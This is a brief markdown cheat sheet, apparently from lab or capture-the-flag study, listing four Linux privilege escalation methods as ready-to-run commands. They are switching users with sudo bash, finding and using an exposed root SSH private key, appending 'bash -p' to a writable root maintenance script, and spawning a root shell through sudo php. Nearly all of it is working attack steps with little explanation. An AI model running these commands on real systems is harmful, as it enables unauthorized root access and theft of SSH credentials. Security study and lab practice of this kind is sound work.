# Root Privilege Escalation Methods

Practical vectors used in labs to escalate from a standard shell to root.

---

## 1. NOPASSWD Sudo Binary Switching
When `sudo -l` shows permission to run `/bin/bash` as another user:
```bash
sudo -u user2 /bin/bash
```

---

## 2. Root SSH Private Key Theft
1. Located exposed root `id_rsa` file (`find / -name id_rsa 2>/dev/null`).
2. Copied key to Kali and locked permissions: `chmod 600 id_rsa`.
3. Logged in directly: `ssh root@<TARGET_IP> -i id_rsa`.

---

## 3. Hijacking Writable Root Maintenance Scripts
When `sudo -l` reveals a root script (`monitor.sh`) that your low-priv user can edit:
```bash
echo "bash -p" >> monitor.sh
sudo /path/to/monitor.sh
```
*(Spawns root shell in privileged mode).*

---

## 4. Sudo PHP Inline Code Execution
When `sudo -l` allows running `php` as root:
```bash
sudo php -r 'system("/bin/sh");'
```
*(Executes `/bin/sh` directly as root through PHP's system call).*
